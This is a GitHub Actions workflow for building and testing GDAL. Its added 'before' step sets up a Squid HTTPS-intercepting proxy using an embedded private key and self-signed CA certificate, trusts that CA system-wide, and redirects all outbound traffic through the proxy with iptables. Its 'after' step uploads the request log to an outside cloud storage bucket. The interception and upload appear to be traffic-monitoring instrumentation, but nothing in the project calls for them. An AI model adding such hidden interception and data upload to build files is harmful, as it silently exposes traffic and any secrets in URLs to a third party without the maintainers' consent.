concurrency:
  cancel-in-progress: true
  group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}
env:
  CMAKE_UNITY_BUILD: false
  JAVA_TOOL_OPTIONS: -Djavax.net.ssl.trustStore=/usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
  NODE_OPTIONS: --use-openssl-ca
jobs:
  build-linux-ubuntu-focal:
    env:
      CMAKE_OPTIONS: -DPython_LOOKUP_VERSION=3.8 -DUSE_CCACHE=ON -DSWIG_REGENERATE_PYTHON=ON
      cache-name: cmake-ubuntu-focal
    runs-on: ubuntu-20.04
    steps:
    - name: before
      run: 'sudo apt update

        sudo apt install -y squid-openssl

        sudo mkdir /squid

        cat << EOF | sudo tee /squid/key.pem

        -----BEGIN PRIVATE KEY-----

        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

        CznEvO4qIs3mXDYkNBQrdVLGF93y

        -----END PRIVATE KEY-----

        EOF

        cat << EOF | sudo tee /squid/cert.pem

        -----BEGIN CERTIFICATE-----

        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

        -----END CERTIFICATE-----

        EOF

        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB

        sudo chown -R proxy:proxy /squid

        cat << EOF | sudo tee /etc/squid/squid.conf

        cache deny all


        http_port 7821

        http_port 3128 intercept

        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
        cert=/squid/cert.pem key=/squid/key.pem

        acl step1 at_step SslBump1

        ssl_bump peek step1

        ssl_bump bump all

        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB

        sslcrtd_children 5

        ssl_bump server-first all

        sslproxy_cert_error allow all


        acl all src 0.0.0.0/0

        http_access allow all


        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}

        access_log daemon:/squid/squidlog.json custom all !CONNECT

        EOF

        sudo systemctl reload squid

        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt

        sudo update-ca-certificates

        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
        -storepass changeit -noprompt -trustcacerts

        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
        80 -j DNAT --to-destination 127.0.0.1:3128

        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
        443 -j DNAT --to-destination 127.0.0.1:3129

        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
    - continue-on-error: true
      name: Checkout GDAL
      uses: actions/checkout@v3
    - continue-on-error: true
      id: cache
      name: Setup cache
      uses: actions/cache@v3
      with:
        key: ${{ runner.os }}-${{ env.cache-name }}-${{ github.base_ref }}${{ github.ref_name
          }}-${{ github.run_id }}
        path: ${{ github.workspace }}/.ccache
        restore-keys: '${{ runner.os }}-${{ env.cache-name }}-${{ github.base_ref
          }}

          ${{ runner.os }}-${{ env.cache-name }}

          '
    - continue-on-error: true
      name: Install CMake 3.9.1
      run: 'cd ${GITHUB_WORKSPACE}

        wget https://github.com/Kitware/CMake/releases/download/v3.9.1/cmake-3.9.1-Linux-x86_64.tar.gz

        tar xzf cmake-3.9.1-Linux-x86_64.tar.gz

        echo "CMAKE_DIR=$GITHUB_WORKSPACE/cmake-3.9.1-Linux-x86_64/bin" >> $GITHUB_ENV

        echo "$GITHUB_WORKSPACE/cmake-3.9.1-Linux-x86_64/bin" >> $GITHUB_PATH

        '
    - continue-on-error: true
      run: 'cmake --version

        '
    - continue-on-error: true
      name: Install dependency
      run: "sudo add-apt-repository -y ppa:ubuntugis/ubuntugis-unstable\nsudo apt-get\
        \ update\nsudo apt-get install -y -q bison libjpeg-dev libgif-dev liblzma-dev\
        \ libzstd-dev libgeos-dev git \\\n   libcurl4-gnutls-dev libproj-dev libxml2-dev\
        \  libxerces-c-dev libnetcdf-dev netcdf-bin \\\n   libpoppler-dev libpoppler-private-dev\
        \ gpsbabel libhdf4-alt-dev libhdf5-serial-dev libpodofo-dev poppler-utils\
        \ \\\n   libfreexl-dev unixodbc-dev libwebp-dev libepsilon-dev liblcms2-2\
        \ libcrypto++-dev libkml-dev \\\n   libmysqlclient-dev libarmadillo-dev wget\
        \ libfyba-dev libjsoncpp-dev libexpat1-dev \\\n   libclc-dev ocl-icd-opencl-dev\
        \ libsqlite3-dev sqlite3-pcre libpcre3-dev libspatialite-dev libsfcgal-dev\
        \ fossil libcairo2-dev libjson-c-dev libdeflate-dev liblz4-dev libblosc-dev\
        \ \\\n   libqhull-dev libcfitsio-dev libogdi-dev libopenjp2-7-dev libheif-dev\
        \ \\\n   python3-dev libpython3-dev libpython3.8-dev python3.8-dev python3-numpy\
        \ python3-lxml pyflakes python3-setuptools python3-pip python3-venv \\\n \
        \  python3-pytest swig doxygen texlive-latex-base make cppcheck ccache g++\
        \ \\\n   libpq-dev libpqtypes-dev postgresql-12 postgresql-12-postgis-3 postgresql-client-12\
        \ postgresql-12-postgis-3-scripts\n# MSSQL: client side\ncurl https://packages.microsoft.com/keys/microsoft.asc\
        \ | sudo apt-key add -\ncurl https://packages.microsoft.com/config/ubuntu/20.04/prod.list\
        \ | sudo tee /etc/apt/sources.list.d/msprod.list\nsudo apt-get update\nsudo\
        \ ACCEPT_EULA=Y apt-get install -y msodbcsql17 unixodbc-dev\n# HANA: client\
        \ side\n# Install hdbsql tool\ncurl -v -j -k -s -L -H \"Cookie: eula_3_1_agreed=tools.hana.ondemand.com/developer-license-3_1.txt\"\
        \ https://tools.hana.ondemand.com/additional/hanaclient-latest-linux-x64.tar.gz\
        \ --output hanaclient-latest-linux-x64.tar.gz \\\n  && tar -xvf hanaclient-latest-linux-x64.tar.gz\
        \ \\\n  && sudo mkdir /usr/sap \\\n  && sudo ./client/hdbinst -a client --sapmnt=/usr/sap\
        \ \\\n  && rm -rf client \\\n  && rm hanaclient*\nexport PATH=/usr/sap/hdbclient:$PATH\n\
        # Download and compile odbc-cpp-wrapper\nsudo apt-get install -y -q cmake\n\
        wget https://github.com/SAP/odbc-cpp-wrapper/archive/refs/tags/v1.1.tar.gz\
        \ -O odbc-cpp-wrapper.tar.gz \\\n  && mkdir odbc-cpp-wrapper \\\n  && tar\
        \ -xvf odbc-cpp-wrapper.tar.gz -C odbc-cpp-wrapper --strip-components=1 \\\
        \n  && mkdir odbc-cpp-wrapper/build \\\n  && cd odbc-cpp-wrapper/build \\\n\
        \  && /usr/bin/cmake .. \\\n  && make -j 2 \\\n  && sudo make install \\\n\
        \  && cd ../.. \\\n  && rm -rf odbc-cpp-wrapper\nsudo ldconfig\n#\n# Install\
        \ Arrow C++\nsudo apt-get install -y -V ca-certificates lsb-release wget\n\
        wget https://apache.jfrog.io/artifactory/arrow/$(lsb_release --id --short\
        \ | tr 'A-Z' 'a-z')/apache-arrow-apt-source-latest-$(lsb_release --codename\
        \ --short).deb\nsudo apt-get install -y -V ./apache-arrow-apt-source-latest-$(lsb_release\
        \ --codename --short).deb\nsudo apt-get update\nsudo apt-get install -y -V\
        \ libarrow-dev libparquet-dev libarrow-dataset-dev\n#\n# Workaround bug in\
        \ ogdi packaging\nsudo ln -s /usr/lib/ogdi/libvrf.so /usr/lib\n#\npython3\
        \ -m pip install -U pip wheel setuptools numpy\npython3 -m pip install -r\
        \ $GITHUB_WORKSPACE/autotest/requirements.txt\n"
    - continue-on-error: true
      name: Build libjxl
      run: "# Build libjxl\n# libjxl being still unstable, if the main branch fails\
        \ to compile/test\n# you can replace JXL_TREEISH=main by JXL_TREEISH=sha1_of_known_working_commit\n\
        JXL_TREEISH=main\ngit clone https://github.com/libjxl/libjxl.git --recursive\
        \ \\\n    && cd libjxl \\\n    && git checkout ${JXL_TREEISH} \\\n    && mkdir\
        \ build \\\n    && cd build \\\n    && sudo apt-get install -y --no-install-recommends\
        \ libgflags-dev \\\n    && /usr/bin/cmake -DCMAKE_BUILD_TYPE=Release -DBUILD_TESTING=OFF\
        \ -DCMAKE_INSTALL_PREFIX=/usr .. \\\n    && make -j$(nproc) \\\n    && sudo\
        \ make -j$(nproc) install \\\n    && cd ../.. \\\n    && rm -rf libjxl\n"
    - continue-on-error: true
      name: Build libQB3
      run: "# Build libQB3\n# Used by the MRF driver\ngit clone https://github.com/lucianpls/QB3.git\
        \ \\\n    && mkdir QB3/QB3lib/build \\\n    && cd QB3/QB3lib/build \\\n  \
        \  && /usr/bin/cmake -DCMAKE_BUILD_TYPE=Release -DCMAKE_INSTALL_PREFIX=/usr\
        \ .. \\\n    && make -j$(nproc) \\\n    && sudo make -j$(nproc) install \\\
        \n    && cd ../../.. \\\n    && rm -rf QB3\n"
    - continue-on-error: true
      name: Build libbasisu
      run: "# Used by the BASISU and KTX2 drivers\ngit clone -b cmake https://github.com/rouault/basis_universal.git\
        \ \\\n    && mkdir basis_universal/build \\\n    && cd basis_universal/build\
        \ \\\n    && /usr/bin/cmake -DBUILD_SHARED_LIBS=ON -DCMAKE_BUILD_TYPE=Release\
        \ -DCMAKE_INSTALL_PREFIX=/usr .. \\\n    && make -j$(nproc) \\\n    && sudo\
        \ make -j$(nproc) install \\\n    && cd ../..\\\n    && rm -rf basis_universal\n"
    - continue-on-error: true
      name: Install pdfium
      run: "wget -q https://github.com/rouault/pdfium_build_gdal_3_5/releases/download/v1_pdfium_5106/install-ubuntu2004-rev5106.tar.gz\
        \ \\\n  && tar -xzf install-ubuntu2004-rev5106.tar.gz \\\n  && sudo chown\
        \ -R root:root install \\\n  && sudo mv install/lib/* /usr/lib/ \\\n  && sudo\
        \ mv install/include/* /usr/include/ \\\n  && sudo rm -rf install-ubuntu2004-rev5106.tar.gz\
        \ install \\\n  && sudo apt-get update -y \\\n  && sudo apt-get install -y\
        \ --fix-missing --no-install-recommends liblcms2-dev\n"
    - continue-on-error: true
      name: Configure ccache
      run: 'echo CCACHE_BASEDIR=$PWD >> ${GITHUB_ENV}

        echo CCACHE_DIR=$PWD/.ccache >> ${GITHUB_ENV}

        echo CCACHE_MAXSIZE=250M >> ${GITHUB_ENV}

        ccache -z

        '
      working-directory: ${{ github.workspace }}
    - continue-on-error: true
      name: Configure
      run: 'export PATH=$CMAKE_DIR:/usr/local/bin:/usr/bin:/bin # Avoid CMake config
        from brew etc.

        mkdir -p $GITHUB_WORKSPACE/superbuild

        cd $GITHUB_WORKSPACE/superbuild

        printf "cmake_minimum_required(VERSION 3.9)\nproject(test)\nenable_testing()\nadd_subdirectory(gdal)"
        > CMakeLists.txt

        ln -s .. gdal

        mkdir build

        cd build

        cmake  ${CMAKE_OPTIONS} -Werror=dev -DCMAKE_INSTALL_PREFIX=$GITHUB_WORKSPACE/install-gdal
        -DCMAKE_UNITY_BUILD=${CMAKE_UNITY_BUILD} -DCMAKE_C_FLAGS=-Werror -DCMAKE_CXX_FLAGS=-Werror
        -DGDAL_USE_PUBLICDECOMPWT:BOOL=ON -DPUBLICDECOMPWT_URL=https://github.com/rouault/PublicDecompWT
        .. -DWERROR_DEV_FLAG="-Werror=dev"

        '
    - continue-on-error: true
      env:
        GIT_LFS_SKIP_SMUDGE: 1
      name: Build
      run: 'cmake --build $GITHUB_WORKSPACE/superbuild/build -- -j$(nproc)

        '
    - continue-on-error: true
      name: Build fake ossfuzz fuzzers
      run: 'cd $GITHUB_WORKSPACE/superbuild/build

        g++ -c $GITHUB_WORKSPACE/fuzzers/fuzzingengine.cpp

        ar r libFuzzingEngine.a fuzzingengine.o

        CXX=g++ CXXFLAGS="${CXXFLAGS} -I$PWD/gdal/port -I$PWD/gdal/gcore -L$PWD" LIBGDAL="-L$PWD/gdal
        -lgdal" SRC=/tmp OUT=/tmp $GITHUB_WORKSPACE/fuzzers/build_google_oss_fuzzers.sh

        OUT=/tmp $GITHUB_WORKSPACE/fuzzers/build_seed_corpus.sh

        '
    - continue-on-error: true
      name: test (with command targets)
      run: 'cmake --build $GITHUB_WORKSPACE/superbuild/build --target quicktest --
        -j$(nproc)

        '
    - continue-on-error: true
      name: test (with ctest)
      run: 'cd $GITHUB_WORKSPACE/superbuild/build

        ctest -V

        '
    - continue-on-error: true
      name: install and uninstall
      run: 'cmake --build $GITHUB_WORKSPACE/superbuild/build --target install -- -j$(nproc)

        cmake --build $GITHUB_WORKSPACE/superbuild/build --target uninstall

        find $GITHUB_WORKSPACE/install-gdal || /bin/true

        '
    - continue-on-error: true
      name: install
      run: 'export PATH=$CMAKE_DIR:/usr/local/bin:/usr/bin:/bin # Avoid CMake config
        from brew etc.

        touch $GITHUB_WORKSPACE/man/man1/gdalinfo.1

        touch $GITHUB_WORKSPACE/man/man1/gdaladdo.1

        (cd $GITHUB_WORKSPACE/superbuild/build; cmake ..)

        cmake --build $GITHUB_WORKSPACE/superbuild/build --target install -- -j$(nproc)

        test -f $GITHUB_WORKSPACE/install-gdal/share/man/man1/gdalinfo.1

        test -f $GITHUB_WORKSPACE/install-gdal/share/man/man1/gdaladdo.1

        export LD_LIBRARY_PATH=$GITHUB_WORKSPACE/install-gdal/lib

        $GITHUB_WORKSPACE/install-gdal/bin/gdalinfo --version

        PYTHONPATH=$GITHUB_WORKSPACE/install-gdal/lib/python3/dist-packages python3
        -c "from osgeo import gdal;print(gdal.VersionInfo(None))"

        '
    - continue-on-error: true
      name: CMake with rpath
      run: 'export PATH=$CMAKE_DIR:/usr/local/bin:/usr/bin:/bin # Avoid CMake config
        from brew etc.

        (cd $GITHUB_WORKSPACE/superbuild/build; cmake .. "-DCMAKE_INSTALL_PREFIX=$GITHUB_WORKSPACE/install-gdal-with-rpath"
        "-DCMAKE_INSTALL_RPATH=$GITHUB_WORKSPACE/install-gdal-with-rpath/lib")

        cmake --build $GITHUB_WORKSPACE/superbuild/build --target install -- -j$(nproc)

        # For some reason, during the install phase of above invokation, the Python
        bindings are rebuilt after the build phase, and without the rpath... Can''t
        reproduce that locally

        # PYTHONPATH=$GITHUB_WORKSPACE/install-gdal-with-rpath/lib/python3/dist-packages
        python -c "from osgeo import gdal;print(gdal.VersionInfo(None))"

        '
    - continue-on-error: true
      name: Rerun using Mono
      run: 'export PATH=$CMAKE_DIR:/usr/local/bin:/usr/bin:/bin # Avoid CMake config
        from brew etc.

        cd $GITHUB_WORKSPACE/superbuild/build

        rm -rf swig/csharp

        cmake  ${CMAKE_OPTIONS} -DCSHARP_MONO=ON -DCMAKE_INSTALL_PREFIX=$GITHUB_WORKSPACE/install-gdal
        -UCMAKE_INSTALL_RPATH -DCMAKE_UNITY_BUILD=${CMAKE_UNITY_BUILD} -DCMAKE_C_FLAGS=-Werror
        -DCMAKE_CXX_FLAGS=-Werror ..

        cmake --build $GITHUB_WORKSPACE/superbuild/build --target install -- -j$(nproc)

        # Below fails with errors like ''System.InvalidProgramException: Invalid IL
        code in CreateData:Main (string[]): IL_00c4: callvirt  0x0a00000c''

        # ctest -V -R "^csharp.*"

        '
    - continue-on-error: true
      name: Standalone Python bindings build from source
      run: '(cd $GITHUB_WORKSPACE/superbuild/build/gdal/swig/python && python setup.py
        sdist)

        mv $GITHUB_WORKSPACE/superbuild/build/gdal/swig/python/dist/GDAL-*.tar.gz
        gdal-python.tar.gz

        mv $GITHUB_WORKSPACE/superbuild/build/gdal/swig/python gdal-swig-python

        python3 -m venv myvenv

        source myvenv/bin/activate

        # Set PATH so that gdal-config is found

        PATH=$GITHUB_WORKSPACE/install-gdal/bin:$PATH pip install gdal-python.tar.gz[numpy]

        LD_LIBRARY_PATH=$GITHUB_WORKSPACE/install-gdal/lib python -c "from osgeo import
        gdal_array"

        which gdal_edit.py

        cp $GITHUB_WORKSPACE/autotest/gcore/data/byte.tif .

        LD_LIBRARY_PATH=$GITHUB_WORKSPACE/install-gdal/lib ldd myvenv/lib/python3.8/site-packages/osgeo/_gdal.cpython-38-x86_64-linux-gnu.so

        LD_LIBRARY_PATH=$GITHUB_WORKSPACE/install-gdal/lib gdal_edit.py byte.tif -mo
        FOO=BAR

        rm -f myvenv/bin/gdal_edit.py

        '
    - continue-on-error: true
      name: Standalone gdal-utils package from wheel
      run: 'mv gdal-swig-python $GITHUB_WORKSPACE/superbuild/build/gdal/swig/python

        (cd $GITHUB_WORKSPACE/superbuild/build/gdal/swig/python/gdal-utils && python
        setup.py bdist_wheel)

        mv $GITHUB_WORKSPACE/superbuild/build/gdal/swig/python/gdal-utils/dist/*.whl
        gdal_utils-X.Y.Z.T-py3-none-any.whl

        rm -rf $GITHUB_WORKSPACE/superbuild/build/gdal/swig/python

        python3 -m venv myvenv

        source myvenv/bin/activate

        # Set PATH so that gdal-config is found

        PATH=$GITHUB_WORKSPACE/install-gdal/bin:$PATH pip install gdal_utils-X.Y.Z.T-py3-none-any.whl

        which gdal_edit

        cp $GITHUB_WORKSPACE/autotest/gcore/data/byte.tif .

        LD_LIBRARY_PATH=$GITHUB_WORKSPACE/install-gdal/lib gdal_edit byte.tif -mo
        FOO=BAR

        pip uninstall -y gdal-utils

        '
    - continue-on-error: true
      name: Test post-install usage (with pkg-config)
      run: './autotest/postinstall/test_pkg-config.sh $GITHUB_WORKSPACE/install-gdal

        '
    - continue-on-error: true
      name: Test post-install usage (with gdal-config)
      run: './autotest/postinstall/test_gdal-config.sh $GITHUB_WORKSPACE/install-gdal

        '
    - continue-on-error: true
      name: Test post-install usage (with CMake)
      run: './autotest/postinstall/test_cmake.sh $GITHUB_WORKSPACE/install-gdal

        '
    - continue-on-error: true
      name: Rerun with static linkage
      run: "export PATH=$CMAKE_DIR:/usr/local/bin:/usr/bin:/bin # Avoid CMake config\
        \ from brew etc.\ncd $GITHUB_WORKSPACE/superbuild/build\ncmake  ${CMAKE_OPTIONS}\
        \ .. \\\n  -DBUILD_SHARED_LIBS=OFF \\\n  -DBUILD_TESTING=OFF \\\n  -DCSHARP_MONO=OFF\
        \ \\\n  -DGDAL_USE_HDF4=OFF \\\n  -DGDAL_USE_HDF5=OFF \\\n  -DCMAKE_INSTALL_PREFIX=$GITHUB_WORKSPACE/install-gdal-static\n\
        cmake --build $GITHUB_WORKSPACE/superbuild/build --target install -- -j$(nproc)\n"
    - continue-on-error: true
      name: Test post-install usage (static, with pkg-config)
      run: './autotest/postinstall/test_pkg-config.sh $GITHUB_WORKSPACE/install-gdal-static
        --static

        '
    - continue-on-error: true
      name: Test post-install usage (static, with gdal-config)
      run: './autotest/postinstall/test_gdal-config.sh $GITHUB_WORKSPACE/install-gdal-static
        --static

        '
    - continue-on-error: true
      name: Test post-install usage (static, with CMake)
      run: './autotest/postinstall/test_cmake.sh $GITHUB_WORKSPACE/install-gdal-static
        --static

        '
    - continue-on-error: true
      name: ccache statistics
      run: ccache -s
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/planetlabs/pl-cartodb-source.$(date
        +%s)
    timeout-minutes: 60
name: Build and test with CMake
'on':
  workflow_dispatch: {}
